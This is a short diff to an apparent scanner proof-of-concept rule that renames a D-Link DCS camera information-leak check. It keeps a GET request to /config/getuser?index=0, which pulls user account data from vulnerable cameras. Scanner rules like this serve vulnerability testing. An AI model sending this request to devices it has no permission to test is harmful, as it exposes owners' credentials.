@@ -1,4 +1,4 @@
-name: poc-yaml-dlink-dcs-2530l-info-leak
+name: poc-yaml-dlink-dcs-info-leak
 rules:
   - method: GET
     path: /config/getuser?index=0
